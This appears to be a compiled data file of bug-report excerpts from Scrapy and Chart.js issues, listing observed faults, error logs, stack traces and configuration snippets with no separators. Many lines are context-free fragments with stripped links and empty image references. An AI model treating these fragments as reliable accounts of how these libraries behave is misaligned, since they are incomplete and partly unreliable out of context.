files with few items are empty (not even a header)
stops the request
it uses the commented out <base> element to get the url to follow
error log:
sequence of process_spider_exception executed multiple times if callback raise exception and yield item
and executed once if only raises exception
version 1.6.0
is able to locate log out link while version 2.3.0 can't
i am unable to execute `scrapy` or `python` commands because everything in .venv/bin has had its executable permissions removed including the python executable that is the target of the `python` symlink.
2020-06-10 10:50:27 [test] info: storing in thread: gs://bucket/output.json
2020-06-09 19:23:03 [scrapy.extensions.feedexport] info: stored csv feed (10 items) in: gs://bucket/output.csv
2020-06-09 19:23:03 [scrapy.extensions.feedexport] info: stored csv feed (10 items) in: gs://bucket/output.csv
the following exception is raised:
2020-04-12 00:04:23 [scrapy.core.scraper] error: spider error processing <get (referer: none)
traceback (most recent call last): file "/.../scrapy/venv-scrapy/lib/python3.7/site-packages/twisted/internet/defer.py", line 1418, in _inlinecallbacks result = g.send(result) file "/.../scrapy/scrapy/utils/py36.py", line 8, in collect_asyncgen async for x in result: file "/.../scrapy/test-spiders/asyncio_spider.py", line 14, in parse await asyncio.sleep(1) file "/library/frameworks/python.framework/versions/3.7/lib/python3.7/asyncio/tasks.py", line 595, in sleep return await future
runtimeerror: await wasn't used with future
this is because the `asyncio`-based reactor is not actually installed, as the third log line of the job shows:
2020-04-12 00:04:23 [scrapy.utils.log] debug: using reactor: twisted.internet.selectreactor.selectreactor
``` full logs:
2020-04-12 00:04:23 [scrapy.utils.log] info: scrapy 2.0.1 started (bot: scrapybot)
2020-04-12 00:04:23 [scrapy.utils.log] info: versions: lxml 4.5.0.0, libxml2 2.9.10, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, twisted 20.3.0, python 3.7.4 (v3.7.4:e09359112e, jul 8 2019, 14:54:52) - [clang 6.0 (clang-600.0.57)], pyopenssl 19.1.0 (openssl 1.1.1d 10 sep 2019), cryptography 2.8, platform darwin-18.7.0-x86_64-i386-64bit
2020-04-12 00:04:23 [scrapy.utils.log] debug: using reactor: twisted.internet.selectreactor.selectreactor
2020-04-12 00:04:23 [scrapy.crawler] info: overridden settings:
{'editor': 'nano', 'spider_loader_warn_only': true, 'twisted_reactor': 'twisted.internet.asyncioreactor.asyncioselectorreactor'}
2020-04-12 00:04:23 [scrapy.extensions.telnet] info: telnet password: a2bd966307b319f0
2020-04-12 00:04:23 [scrapy.middleware] info: enabled extensions:
['scrapy.extensions.corestats.corestats', 'scrapy.extensions.telnet.telnetconsole', 'scrapy.extensions.memusage.memoryusage', 'scrapy.extensions.logstats.logstats']
2020-04-12 00:04:23 [scrapy.middleware] info: enabled downloader middlewares:
['scrapy.downloadermiddlewares.httpauth.httpauthmiddleware', 'scrapy.downloadermiddlewares.downloadtimeout.downloadtimeoutmiddleware', 'scrapy.downloadermiddlewares.defaultheaders.defaultheadersmiddleware', 'scrapy.downloadermiddlewares.useragent.useragentmiddleware', 'scrapy.downloadermiddlewares.retry.retrymiddleware', 'scrapy.downloadermiddlewares.redirect.metarefreshmiddleware', 'scrapy.downloadermiddlewares.httpcompression.httpcompressionmiddleware', 'scrapy.downloadermiddlewares.redirect.redirectmiddleware', 'scrapy.downloadermiddlewares.cookies.cookiesmiddleware', 'scrapy.downloadermiddlewares.httpproxy.httpproxymiddleware', 'scrapy.downloadermiddlewares.stats.downloaderstats']
2020-04-12 00:04:23 [scrapy.middleware] info: enabled spider middlewares:
['scrapy.spidermiddlewares.httperror.httperrormiddleware', 'scrapy.spidermiddlewares.offsite.offsitemiddleware', 'scrapy.spidermiddlewares.referer.referermiddleware', 'scrapy.spidermiddlewares.urllength.urllengthmiddleware', 'scrapy.spidermiddlewares.depth.depthmiddleware']
2020-04-12 00:04:23 [scrapy.middleware] info: enabled item pipelines:
2020-04-12 00:04:23 [scrapy.core.engine] info: spider opened
2020-04-12 00:04:23 [scrapy.extensions.logstats] info: crawled 0 pages (at 0 pages/min), scraped 0 items (at 0 items/min)
2020-04-12 00:04:23 [scrapy.extensions.telnet] info: telnet console listening on 127.0.0.1:6023
2020-04-12 00:04:23 [scrapy.core.engine] debug: crawled (200) <get (referer: none)
2020-04-12 00:04:23 [asyncio] debug: using selector: kqueueselector
2020-04-12 00:04:23 [scrapy.core.scraper] error: spider error processing <get (referer: none)
traceback (most recent call last): file "/.../scrapy/venv-scrapy/lib/python3.7/site-packages/twisted/internet/defer.py", line 1418, in _inlinecallbacks result = g.send(result) file "/.../scrapy/scrapy/utils/py36.py", line 8, in collect_asyncgen async for x in result: file "/.../scrapy/test-spiders/asyncio_spider.py", line 14, in parse await asyncio.sleep(1) file "/library/frameworks/python.framework/versions/3.7/lib/python3.7/asyncio/tasks.py", line 595, in sleep return await future
runtimeerror: await wasn't used with future
2020-04-12 00:04:23 [scrapy.core.engine] info: closing spider (finished)
2020-04-12 00:04:23 [scrapy.statscollectors] info: dumping scrapy stats:
{'downloader/request_bytes': 211, 'downloader/request_count': 1, 'downloader/request_method_count/get': 1, 'downloader/response_bytes': 1001, 'downloader/response_count': 1, 'downloader/response_status_count/200': 1, 'elapsed_time_seconds': 0.778025, 'finish_reason': 'finished', 'finish_time': datetime.datetime(2020, 4, 12, 3, 4, 23, 925629), 'log_count/debug': 2, 'log_count/error': 1, 'log_count/info': 10, 'memusage/max': 54767616, 'memusage/startup': 54767616, 'response_received_count': 1, 'scheduler/dequeued': 1, 'scheduler/dequeued/memory': 1, 'scheduler/enqueued': 1, 'scheduler/enqueued/memory': 1, 'spider_exceptions/runtimeerror': 1, 'start_time': datetime.datetime(2020, 4, 12, 3, 4, 23, 147604)}
2020-04-12 00:04:23 [scrapy.core.engine] info: spider closed (finished)
spider starts and finishes immidiately
$ python3.7 is_generator_bug.py
traceback (most recent call last): file "is_generator_bug.py", line 16, in <module> tree = ast.parse(dedent(inspect.getsource(c))) file "/usr/local/cellar/python/3.7.7/frameworks/python.framework/versions/3.7/lib/python3.7/ast.py", line 35, in parse return compile(source, filename, mode, pycf_only_ast) file "<unknown>", line 1 def doit(self): ^
indentationerror: unexpected indent
cert is empty
`valueerror('please supply exactly one of the following arguments: urls, css, xpath')` exception is raised.
garbled code appears
everytime the spider is launched every file is downloaded again.
scrapy commands yield `fatal error in launcher: unable to create process using \'"d:\\bld\\scrapy_1572360424769\\_h_env\\python.exe" "c:\\users\\path\\to\\continuum\\anaconda3\\scripts\\scrapy.exe" version\'` there is no d:\\ on my machine
i have no idea where this path is coming from.
`process_spider_exception` is not called
in the spider, `isinstance(response, textresponse)` is `true`, even though the `content-type` header is `application/pdf`.
return zero exit code
it is forbidden.
it navigates to
redirct to ` `
exception thrown
fails with a typeerror
`itemloader` initialized from the `x` item reprocesses its fields and loads `{'x': 'v'}`.
scales maintain default values.
it looks like that chart.js doesn't support well to draw the vertical line, so i had to list the data points one by one
as a result, i got what i want, but some of the last points were rendered as undefined
`new chart(ctx1, { type: 'line', data: { labels: ['20/10/22 0:00', '20/10/22 12:00', '20/10/23 0:00', '20/10/23 12:00', '20/10/24 0:00', '20/10/24 12:00', '20/10/25 0:00', '20/10/25 12:00', '20/10/26 0:00', '20/10/26 12:00', '20/10/27 0:00', '20/10/27 12:00', '20/10/28 0:00', '20/10/28 12:00', '20/10/29 0:00'], datasets: [{ label: 'dc', data: [ { x: '20/10/22 0:00', y: 0 }, { x: '20/10/22 12:00', y: 60 }, { x: '20/10/23 0:00', y: 120 }, { x: '20/10/23 0:00', y: 0 }, { x: '20/10/23 12:00', y: 60 }, { x: '20/10/24 0:00', y: 120 }, { x: '20/10/24 0:00', y: 0 }, { x: '20/10/24 12:00', y: 60 }, { x: '20/10/25 0:00', y: 120 }, { x: '20/10/25 0:00', y: 0 }, { x: '20/10/25 12:00', y: 60 }, { x: '20/10/26 0:00', y: 120 }, { x: '20/10/26 0:00', y: 0 }, { x: '20/10/26 12:00', y: 60 }, { x: '20/10/27 0:00', y: 120 }, { x: '20/10/27 0:00', y: 0 }, { x: '20/10/27 12:00', y: 60 }, { x: '20/10/28 0:00', y: 120 }, { x: '20/10/28 0:00', y: 0 }, { x: '20/10/28 12:00', y: 60 }, { x: '20/10/29 0:00', y: 120 }, { x: '20/10/29 0:00', y: 0 } ] }] }, options: { responsive: true, title: { display: true, text: 'sdl file count' }, elements: { line: { tension: 0 }, point: { radius: 1 } }, scales: { yaxes: [{ display: true, ticks: { beginatzero: true, stepsize: 10, max: 140 } }] } } })`
all plugins imported to the project are applied to all `chart` instances regardless the configuration
after digging into the source code, i've got the following foundings: 1
initially the problem dawns to the fact that all plugins registered with `chart.plugins.register()` are called whether they were configured for specific `chart` instance or not
i traced it from the [pluginservice.notify()]( #l97) method
the core problem lays in the [pluginservice .createdescriptors()]( #l141) method
from my understanding the intention of this code is to check if the each plugin was configured for the current `chart` instance, add to instance's plugins collection or ignore it
and here is a problem: ```jsx let opts = options[id]; if (opts === false) { continue; } if (opts === true) { opts = {}; } result.push({ plugin, options: mergeif({}, [opts, defaults.plugins[id]]) }); ``` if chart `options` doesn't contain plugin configuration the `opts` will be `undefined`, so none of the conditions will work
and the plugin will be added to the collection.
currently, when adding more than one exercise to a workout (array), it will not display totals, only one of the objects from the arrray
the data makes it to the final stage of the application where we pass information to chart.js
but despite properly providing the data, it will not correctly display on the chart.
`chart.generatelegend` does not generate any css-colors for the `span`-element for `null` and `undefined` values.
i filed this as *bug report* since the chart.js actually knows the difference between `null` and `undefined` colors, since `undefined` colors can happen very easily by using color dictionaries paired with dynamic or unknown data
the grey color is used by design, unlike the black color which is the default color for canvas objects, and unlike `null`-data it does not break the chart on hover, so i reckon it is a valid input
i understand that support for `generatelegend` will be dropped soon and the future functionality will be moved to a plugin.
if you add a scale configuration, the chart is broken
here is a table with different options matrix and the result: | options indexaxis | dataset indexaxis | scale id | scale axis | result
| ----------------- | ----------------- | -------- | ---------- | ------
| 'y' | undefined | undefined | undefined | works
| 'y' | 'y' | undefined | undefined | works
| undefined | 'y' | undefined | undefined | works
| 'y' | undefined | 'y' | undefined | works
| 'y' | undefined | 'y' | 'x' | works
| 'y' | 'y' | 'y' | undefined | works
| 'y' | 'y' | 'y' | 'x' | works
| undefined | 'y' | 'y' | undefined | **doesn't work**
| undefined | 'y' | 'y' | 'x' | **doesn't work**
with above configuration, there is the following exception: ```javascript
uncaught typeerror: can't convert linewidth to number drawlegendbox draw draw draw draw _update _update _request drawlegendbox draw foreach self-hosted:206 draw draw draw _update foreach self-hosted:1934 _update _request
``` if you disable the `legend` or if you don't set the object to`boderwidth`, it works.
it seems the `borderwidth` as object is not managed by legend.
chart.defaults.global.tooltips.callbacks.label only works for bar, line
labels are separated in ","
package installs the gihub repo code
bar chart not generating
if i change chart type to line chart
it works but bar chart not generating
using the master/dist, if the options are stored before to register the plugin you get the following exception: ```javascript
uncaught error: can not register "test", because "defaults.plugins.test" would collide with existing defaults
``` ### master/dist ```javascript
chart.plugins.register(myplugin);
chart.defaults.global.plugins.test = mypluginoptions; // does not work
chart.defaults.global.plugins.test = mypluginoptions;
chart.plugins.register(myplugin);
[14:25:36] using gulpfile ~/src/github/chart.js/gulpfile.js
[14:25:36] starting 'docs'...
info: installing 5 plugins using npm@3.9.2 info: info: installing plugin "search-plus" info: install plugin "search-plus" (*) from npm with version 1.0.3 /home/alessandro/src/github/chart.js/node_modules/npm/node_modules/graceful-fs/polyfills.js:287 if (cb) cb.apply(this, arguments) ^ typeerror: cb.apply is not a function at /home/alessandro/src/github/chart.js/node_modules/npm/node_modules/graceful-fs/polyfills.js:287:18 at fsreqcallback.oncomplete (fs.js:169:5)
as of 3.0.0-beta.3 i have to define values of `scalelabel` and i'm currently having to `& any` to get my config in without typescript yelling at me.
when series have big enough values (ex 1000000) and with yaxes bound with small enough values (from -0.05 to 0.05) rectangle flickers for duration of initial animation and starts not at the x-axis
the tool tip's x value is being take from the series index number rather than from the data point x value.
when ''scatter'' chart is first in `datasets` no charts are shown, only empty grid
if i have the following xaxes configuration:
{ type: 'category', labels: ['jorge', 'juan'],
and this dataset
[{x: "juan", y: "84.00"}, {x: "juan", y: "87.50"}, {x: "jorge", y: "87.50"}]
the first point `{x: "juan", y: "84.00"}` tooltip shows "jorge" instead of "juan"
![image]( as it is the first point, it uses the first label instead of using the `x` value
the same happens if i have an extra data point ![image]( as we only have 2 labels, the third label is "undefined" (instead of showing the `x` value)
the problem is there's a pointy edge on some points
![94624334-7c70c200-02b6-11eb-9da9-9e8e7a748634](
(3.0.0-beta)
[chrome on windows]
if the canvas is styled via css and has a padding attribute, then this does not work
the hit box seems to be displaced by the padding value
[firefox on windows]
this works as expected if only the padding attribute is present, but fails similarly to chrome when in addition position: absolute is set (like in the fiddle).
`npm install chart.js --save` installs moment to node_modules
dist/chart.min.js requires moment
extended horizontal bar chart with no changes doesn't display bars.
using chrome works fine
without the `offset` property, the first and the last bars are hidden outside the canvas
working with safari and firefox the gap between the y axis and the first graph is much bigger than it should
without the `offset` the gap is smaller, but it's there too.
if i remove `distribution: 'series'` property from the graph, it only works on chrome
- with `offset` on safari:
![captura de pantalla 2020-09-15 a las 17 22 56]( - without `offset` on safari:
![image](
on chart expected pointstyle is appearing but in legend its display circles with all title.
if value plots with rotation in chart, it should be display in legend with same rotation.
the line is removed, but the corrupted background is present
![current](
sometimes all labels don't get displayed in the tooltip
label callback doesn't get invoked for some chart datasets that visible on chart (blue and pink)
<img width="1042" alt="screen shot 2020-08-26 at 9 38 07 pm" src=" ">
<img width="1043" alt="screen shot 2020-08-26 at 9 38 27 pm" src=" ">
<img width="1055" alt="screen shot 2020-08-26 at 9 38 46 pm" src=" ">
in specific circumstances, an incorrect bar highlighted as a hovered.
![barchart-hover-bug]( [codepen](
a `maximum call stack` error is shown in the console.
uncaught rangeerror: maximum call stack size exceeded at chartelement.update (chart.bundle.js:11478) at fitboxes (chart.bundle.js:7131) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149) at fitboxes (chart.bundle.js:7149)
using the dist/master (but it worked before with a version of 1 month ago), you got: `uncaught error: class does not have id `
tooltip stays visible when i tap outside of a canvas
setting the minbarlength property has no effect, and bars with equal values to the minimum on the y-axis are not shown.
in horizontal bar graph, when values are fetched after response from an api, sometimes the data on graph doesn't show up background color even though the backgroundcolor array is initialized with enough background color values and there is a value associated with each key in the data response
issue: ![image](
in this case u can see that bars are not continuous
canvas doesn't redraw when browser zooms in or out.
toggling dataset visibility through legend while animation is not complete results in a race condition between the event handler and animator updating elements
so element properties are changed during the event handling and can cause unexpected results in plugins.
the labels are overlapping
ticks are `40, 60, 90, 100`
instead, the label attribute interferes with this, causing the same data values to be drawn twice (albeit potentially with different styling).
![whatsapp image 2020-07-23 at 11 31 31](
when using the legend plugin, it uses element defaults from the line element
however, the line element might have been shaken out in the esm case or just not registered #l295
going to dist/master, i've created another sample based on what @kurkle created, changing only the link to chart.js, and doesn't work anymore.
but also changing the @kurkle sample, setting does not work
![bugfloatingbar](
using dist/master, the `chart.defaults.legend` is `undefined`
the `chart.defaults.tooltips` and `chart.defaults.title` are `undefined` as well
![buglegend](
using the classic style, reported into documentation, you got an error: ##### code ```javascript
function custom() { chart.controllers.line.call(this, arguments);
} custom.prototype.draw = function() { chart.controllers.line.prototype.draw.call(this, arguments);
} custom.id = 'myline';
custom.defaults = chart.defaults.line; chart.registry.addcontrollers(custom);
``` ##### error
```javascript
uncaught error: "myline" is not a registered controller
_get getcontroller buildorupdatecontrollers update chart <anonymous> pen.js:44
see #l13
index.js:4976 uncaught typeerror: cannot read property 'category' of undefined
``` pointing at:
``` object.keys(scales).foreach(key => { const scale = scales[key]; mergeif(scale, [defaults.scales[scale.type], defaults.scale]); });
the line chart is drawn but all methods of controller don't receive the expected arguments.
the arguments array is empty (apart for `update` method which instead of receive a boolean, got "reset" as string)
![bugcontrollernew](
in a very particular situation, when the viewport has the exact size to make the old #2127 appears, the tooltips are not showing up.
using the dist/master, when you are mousing over the dataset for the first time, the tooltip doesn't appear
if you are mousing out, the tooltip will appear and tehn mousing over again, the tooltip will disappear
the sample that i have used is the chart.js one, taken from let me also outline that the 2 samples with tooltip custom calback do not work because they have a couple of bugs: #l46 the argument passed to the callback is not `tooltip `but an object with `{ chart: ..., , tooltip: ...}` #l101 the bodyfont is not part of the tooltip but of the options inside the tooltip, therefore should be `tooltipel.style.font = tooltip.options.bodyfont.string;`
unfortunately this wont work with animation duration set to 0
tooltipmodel.opacity == 0 on mouseover, jumps to 1 on mouseout and then rapidly decreases to 0
(its actually tooltipmodel[0].opacity due to
the scaling is calculated from the full dataset and not the "filtered" dataset.
the x-position of the data in the graph seem to be correctly positioned among the dates
however, **the y-position seem to still rely on the index - it does not change** as the starting date of the dataset changes (see images 2, 3 and 4)
note that the blue line always start at y-position 5
not only is the y-position buggy, but the area under the graphs look strange, and seem to work with the indices rather than the dates
see image <img width="584" alt="image" src=" "> **figure 1)** normal behavior, datasets start at same time
<img width="581" alt="image" src=" "> **figure 2)** strange behavior, one dataset (blue) start at a time-offset
<img width="582" alt="image" src=" "> **figure 3)** strange behavior, one dataset (blue) start at a large time-offset
<img width="580" alt="image" src=" "> **figure 4)** strange behavior, one dataset (blue) start at a large time-offset
now with fill-parameter of dataset set to `origin` instead of filling mode relative to dataset index
<img width="580" alt="image" src=" "> **figure 5)** no stacking
chart for reference.
label is cut off:
there's a line drawn though it when it's on the right ![screenshot from 2020-06-26 20-58-01](
using dist/master, i have seen that, randomly, the color is not apply to whole dataset (using for instance a bar chart)
seeing you can see that at the first execution, the color is correct: ![pre1]( clicking on the button, to change the var in order that the plugin can change the color, the bars don't have the same color: ![post1]( please be aware that is not happening always but using the codepen, try some times and you should see the bug.
and steps to reproduce (for bugs)
at the moment it is the other way around
the dataset with the lower number will be drawn on top of the other one.
look at this [jsfiddle]( where the lines are supposed to be on top of the bars but that is not the case.
in order to get the right chart i need to change the order number of the lines and the bars and get this new [jsfiddle](
there is an extraneous gridline between the '135' and '158' labels.
<img width="606" alt="screen shot 2020-06-21 at 3 43 25 pm" src=" ">
using the dist/master library, the behavior is that t the first "update" this is the result: ![pre]( if i invoke the update again (setting again to left), it works: ![post](
working correctly for 2 datasets of three (cv and projection are ok, vpc is messed up).
in my example, values for dataset 'vpc' are plotted correctly (from week 2020-26 to week 2020-31) while corresponding tooltips are linked to other dates (from week 2021-18 to week 2021-23).
and starting with week 2021-18 the tooltip is shifted to the left.
throws uncaught typeerror: cannot read property 'chart' of undefined
horizontal bar chart with time scale on x-axis flickers while drawing the bars on the canvas
it is not visible with less animation duration.
when i log the tooltip model instance, passed as argument to `custom` callback, the instance is `undefined`.
throws an exception when mouse is hovered or clicked on the chart:
`cannot read property 'getboundingclientrect' of null`
if you change the version to a lower 2.x.x it works without any problem
i have only on one data hover effect.
the issue on console is `error: "myline" is not a chart type.`.
then i printed the content of `chart.controllers`, expecting to find `chart.controllers.myline` but was missing
## additional question
i was using into version 2.9.3 `chart.controllers.line.extend`
can i still use it to extend an existing controller, in version 3.0.0?
using the dist/master library, the behavior is that the text of title is changed but not font size.
stack overflow happens in constructor
using version 2.9.3 from npm:
uncaught rangeerror: maximum call stack size exceeded at chartelement.update (chart.js:11474) at fitboxes (chart.js:7127) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145) at fitboxes (chart.js:7145)
mousing over chart during animation causes animation to restart
if the window is taller than ~780px the pie chart won't animate
however, if you are using a colour value like "green" or "red", the section becomes pitch black when hovering over it
i tested it with the hex values of red, green and blue as well as the values red, green and blue
## code example
the current behavior, as shown in the gif is that the legend doesn't automatically update with the graph on the first update call, but does on subsequent calls.
v3 dev is 10x slower than v3.0.0-alpha
with version 3, the above code does not work and the data points are not updated and the chart does not change the data representation
to work properly it seems you have to create every time new point objects (not good for performance), as the code of scatter chart sample is showing: ```javascript
document.getelementbyid('randomizedata').addeventlistener('click', function() { scatterchartdata.datasets.foreach(function(dataset) { dataset.data = dataset.data.map(function() { return { x: randomscalingfactor(), y: randomscalingfactor() }; }); }); window.myscatter.update();
using the development build, the rendering of the chart will apply a "white" area in the middle of the chart itself
![radar300](
but when user goes to another page and comes back by pressing back or in-page link, the charts are all blank
im guessing the browser is loading from the cache
since this page has huge data, i dont want the page to load again.
a tiny bit is still visible
i was having a look to samples at `master ` and the [polararea sample]( throws the following exception: ```
uncaught typeerror: cannot read property 'draw' of undefined at object.afterdraw (chart.min.js:13) at t.value (chart.min.js:13) at t.value (chart.min.js:13) at t.value (chart.min.js:13) at t.value (chart.min.js:13) at t.value (chart.min.js:13) at e (chart.min.js:13) at t.value (chart.min.js:13) at t.value (chart.min.js:13) at new t (chart.min.js:13)
when adding more than 12 data series to the chart, an error occurs and no further series can be added.
only ~75% of the canvas width is used ## root cause
the problem appears to be how the `end` offset is computed in the time scale: #l406 this method is [passed the data timestamps]( #l693) which has a large gap
this causes `end` and thus `factor` to be incorrectly calculated
### error case offsets
```javascript
start: 0.05555
end: 0.333333
factor: 0.72
``` in the error case, the `factor` variable is set to `0.72`
if the `factor` is manually overridden to `0.89` the chart is perfect
this error does not occur when `options.offset` is false (i.e
the chart is not a bar chart)
due to how `this` is scoped in arrow functions, using one for the `onclick` option means that there is no way to access the `chart` since this is done scoping `this` to be the legend when calling the callback
mark several points, when they are very close
![image](
with flex box and column direction, the height increases but does not reduce
there is a darker grid line when the tick for the two x axes overlap.
the sparkline chart is blurry
the straight line is not white (looks like it has some kind of transparency)
it's like you draw a line with a pencil that is not sharpened enough.
the initial options are passed to the `dateadapter` constructor, and they can be updated once (and only once)
subsequent updates are not propagated
i believe this to be because after the initial render, `chart.options.scales.x.adapters.date` still references the same object passed to the `dateadapter` constructor
after the first update, `chart.options.scales.x.adapters.date` is replaced with a new object (as a result of config merging).
only an object's own enumerable properties (returned by `object.keys`) are preserved.
`helpers.merge` appears to be at fault here, as instance methods are not enumerable properties.
only renders once upon menu selection but when trying to reselect the menu item, it does not render the chart only if i resize the chrome browser
not all legend items are fully visible and items that are above or below the actual chart do not trigger events (click, hover, leave) and can't be toggled if `options.legend.position` is set to left or right.
when viewed on desktop, everything works as expected
when viewed on ios (ipad, iphone, etc) the lines are not shown on the line chart.
if two entries pointing to the same category are next to each other in the dataset no chart data is displayed
with other orderings the bars are plotted as intended.
the _first line_ of the label is horizontally centered with the remaining lines to the right of it
running npm build to produce a release package including chartjs, with dependency on [momentjs]( leads to a critical bug when using a time chart
the bug chrashes the whole webpage due to a missing or incompatible function in momentjs
it is difficult to recreate the bug, since it doesn't occur when running the webpage in development with node
at least, this is the stacktrace i receive in the web console
uncaught error: this method is not implemented: either no adapter can be found or an incomplete integration was provided
at jt.xt (chart.js:10897) at n.update (chart.js:14377) at ut (chart.js:7127) at object.update (chart.js:7341) at $t.updatelayout (chart.js:9680) at $t.update (chart.js:9633) at $t.construct (chart.js:9357) at new $t (chart.js:9294) at t.renderchart (index.js:247) at t.componentdidmount (index.js:52)
the number of gridlines is as high as the number of datasamples, but only if the ticks are not displayed
if the ticks are displayed, the number of gridlines limits correctly.
nan values are incorrectly displayed as zero (after release 2.8.0)
chart's height will collapsed to 0.
if you set the `barthickness: 8` you get something like this, the bars are overflowing in each other
the chart is hard to read also.
![afbeelding](
hover-out animation of the first hovered point is restarted if we hover a new point before it finishes.
it looks like the original hovered point is flickering.
i have to call `chart.update()` twice to get changed legend color.
currently, the tooltip only closes when a click occurs inside the canvas.
the points have an offset.
bubbles are drawn over the title, legend, y-axes and x-axes
in the new version 3.0.0a with same code and identical values, the line disappears gradually.
sample code using custom tooltips gives an error
error message: **uncaught typeerror: cannot read property 'opacity' of undefined**.
when the canvas is inside a shadow dom and the chart is configured to display tooltips (`tooltips: {enabled: true}`), there are no tooltips displayed ## comment
the issue is also reproducible using custom tooltips
only the bars change color
the legend is changing the color to the previously selected color.
if the intervals between data points are too short, using `unit: 'month'` leads to unusable chart.
when the width of the y-axis labels increases, the datapoints right on the y-axis are hidden during the animation
they are shown again once the animation is finished (illustrated in the following gif, see left part of the chart):
![kapture 2020-03-20 at 14 10 43](
the left green bar is shown at a wrong place -- too much to the bottom of the plot: ![image]( clicking on the legend to make the red dataset disappear shows the green dataset at a correct position: ![image]( i read #3288 where someone explains that "positive values stack together" and "negative values stack together", which makes no sense to me
of course i could potentially hack around this and process my numbers in any way i see fit, but i wonder what is the reason for making zero a special case
if i'm required to pass both `[lower, upper]` coordinates, then i expect my stack to actually use them.
first tick has value of 16, then 4 ticks with value 18 and then last tick with value of 2.
apparently major gridline displayed at 1:15: <img width="969" alt="screenshot 2020-03-15 at 15 18 21" src=" ">
line is cutting off from top "chart.js": "2.9.3"
somehow the first and last points of my dataset is being hidden in the canvas, and partially drawn
![image]( ![image]( also, when i leave both appearing, the last and first points are not draw
![image](
if i'm applying zoom:2; the hover is desynchronized from the canvas element
instead of having a line between points it stops showing the line and only the points
this happens around 17000px
see example:
the fill is also missing from this point
it seems that fill is colored as expected in version 2.6 (not 2.5 or 2.7), but the actual line is still missing
in version 2.5 there is no fill or line between the points
![2 5]( in version 2.6 the fill is working, but the line disappears between the points
![2 6]( in version 2..9.3 there is no fill or line between the points
![2 7](
bar chart does not display, with the following error: ![image](
![image](
the label isn't displayed since the version 2.8.0
before it works as expected.
the border & point are still on the most top layer
top dataset fills down to a non-stepped baseline, not aligned with the bottom dataset.
different 0 lines for each y axis ## workaround
use suggested min-max
when the number of datasets after the click is equal or smaller than before the click, everything is good.
when it\'s higher, the error "cannot read property \'_meta\' of undefined" raises.
in version 2.9.3 the labels are overlapping:
x-axis labels cuts from bottom
to replicate in firefox press ctrl + shift + m in firefox
![image](
it uses `ticks` instead of data points
this approach worked well when i had only one dataset
but when i added another dataset to the chart and tried to add some data, i have received an error: > chart.js@2.9.3:7 uncaught typeerror: cannot read property 'getbasepixel' of undefined
> at n.updateelement (chart.js@2.9.3:7)
> at n.addelementandreset (chart.js@2.9.3:7)
> at n.insertelements (chart.js@2.9.3:7)
> at n.ondatapush (chart.js@2.9.3:7)
> at chart.js@2.9.3:7
> at object.each (chart.js@2.9.3:7)
> at array.value (chart.js@2.9.3:7)
when creating the chart with 45000 datapoints, the following error is thrown and the canvas stays empty:
rangeerror: maximum call stack size exceeded at computelabelsizes (chart.js:11242) at chartelement._getlabelsizes (chart.js:11911) at chartelement.calculatetickrotation (chart.js:11689) at chartelement.update (chart.js:11547) at fitboxes (chart.js:7127) at object.update (chart.js:7341) at chart.updatelayout (chart.js:9680) at chart.update (chart.js:9633) at chart.construct (chart.js:9357) at new chart (chart.js:9294)
wkhtmltopdf 0.12.5 with chartjs v2.9.3 does not render the charts in the pdf
``` yaxes: [{ ticks: { min: miny, maxtickslimit:5 }, gridlines: { display:false } }]
currently the values less than initial value (min) are ignored by chartjs.
while a first label gets aligned correctly, a second one - of a different data set in this case - gets vertically offset
the chart itself gets more narrow as the total space for the labels on the right side grows by the width of the second label
first label:
![screenshot 2020-01-25 at 19 34 34]( adding second label:
![screenshot 2020-01-25 at 19 34 43]( whether this is an actual bug or not, i haven't found any setting to work so far which would align or position the second label same as the first.
even if i put `pointhitradius: 0` for a specific data set, some of these points show an effect randomly when hovering another data point
![screen-recording-2020-01-25-at-17 05 34]( is there any connection between those, any ids that could conflict or suchlike?
hovering over point on line chart when the legend is hidden updates the font weight of `filltext` text within extended line chart
removing ```
options: { legend: { display: false }
``` fixes the issue, but i do want the legend to be in hidden in my chart.
with master, chart appears abrutly, without any initial animation.
sometimes portions of the line are not filled and remains white.
it happens in master but does not happen 2.9.3.
chart.js drawing bar element with border lines in the versions started from 2.8.0 (version 2.7.3 is okey)
custom tooltip does not render, the following errors appear in the console: `uncaught typeerror: wt.distancebetweenpoints is not a function`
`uncaught typeerror: cannot read property 'opacity' of undefined`
there is severe flickering in the point animation when you move around the chart.
video:
in v2.7.3, correct behavior is observed
in v2.9.0, y axis still shows
`nan` datapoint is displayed as a zero value.
### good - this renders on a desktop screen 192 .
![1]( ### bad - this renders on a 2019 macbook pro
![2](
the height is staying the same when there are a lot of items
i tried a few things, and i'm not sure if it's a bug actually.
this works when i hover the right one.
however, if the left one is hovered, the right one is still visible on top of the hovered one.
tooltip is not displayed
order 1 is on top while order 2 is below.
instead the right border stays like in this fiddle:
problem a - the line plot's 0 point is shifted to the right by a 1 point.
problem b - the line plot's point are aligned to the lower edge of the bar.
when you have 2 charts in separate cols and you shrink the window
the two charts expand full width.
i tried to fiddle with responsive: true, maintainaspectratio and divs but to no avail ( #important-note) try resizing the page on this fiddle (growing will work but shrinking will make the two charts take full width) in chrome
the step down of the filled area happens already at the middle of the x-value area.
should be at the vertical if you remove options.scales: {xaxes: [{gridlines: {offsetgridlines: true}}]}, the step down is drwan at the right position, but the main data point is then drawn at the left edge of the x-area.
when setting borderwidth to 0 it is not respected
when combining this with hoverwidth not zero some odd behaviour is obtained
i first noticed this in issue #4873 a couple years ago but did not know the cause
with multiple datasets when you hover a point, all of one dataset and part of another are affected by the hoverwidth setting
when you change one of the dataset's borderwidth to non-zero a second type of behaviour is observed, and when you set both datasets' to non-zero a third and correct behaviour is obtained.
chart.js:4879 uncaught typeerror: cannot read property 'options' of undefined at chartelement.initialize (chart.js:4879) at chartelement.initialize (chart.funnel.min.js? [sm]:1) at chartelement.datasetcontroller (chart.js:3617) at new chartelement (chart.js:2395) at chart.buildorupdatecontrollers (chart.js:9573) at chart.update (chart.js:9626) at chart.construct (chart.js:9357) at new chart (chart.js:9294) at c.loadchart (widget.js:1920) at c.postloadwidget (widget.js:1472)
